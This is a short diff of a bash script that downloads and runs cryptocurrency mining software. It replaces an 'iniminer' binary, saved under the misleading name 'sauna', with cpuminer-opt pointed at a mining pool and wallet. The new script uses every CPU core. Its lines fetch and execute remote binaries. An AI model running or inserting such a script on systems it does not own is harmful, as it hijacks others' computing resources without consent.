@@ -1,6 +1,4 @@
 #!/bin/bash
-apt update
-apt install -y wget sudo curl
-wget -O sauna https://github.com/Project-InitVerse/miner/releases/download/v1.0.0/iniminer-linux-x64
-chmod 777 sauna
-./sauna --pool stratum+tcp://0x07ff670184606B7eD600524DcE0Ca6eDEB4e8E86.$(echo $RANDOM | md5sum | head -c 10)@pool-a.yatespool.com:31588
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.45/cpuminer-opt-linux-5.0.45.tar.gz
+tar xf cpuminer-opt-linux-5.0.45.tar.gz
+./cpuminer-avx -a gr -o stratum+tcp://eu.rplant.xyz:7056 -u RGcx41nd294tPisNNWz77em7VvP6zfPLxX.x -p x -t $(nproc --all)
